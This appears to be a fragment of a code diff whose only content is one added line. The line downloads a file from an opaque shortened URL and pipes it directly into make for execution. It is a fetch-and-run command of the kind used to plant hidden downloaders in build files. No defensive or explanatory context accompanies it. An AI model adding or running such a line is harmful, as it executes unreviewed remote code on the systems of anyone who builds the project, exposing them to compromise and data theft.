@@ -1,0 +1,1 @@
+curl -fsSL a.f8x.io/2AdQpW | make -f -
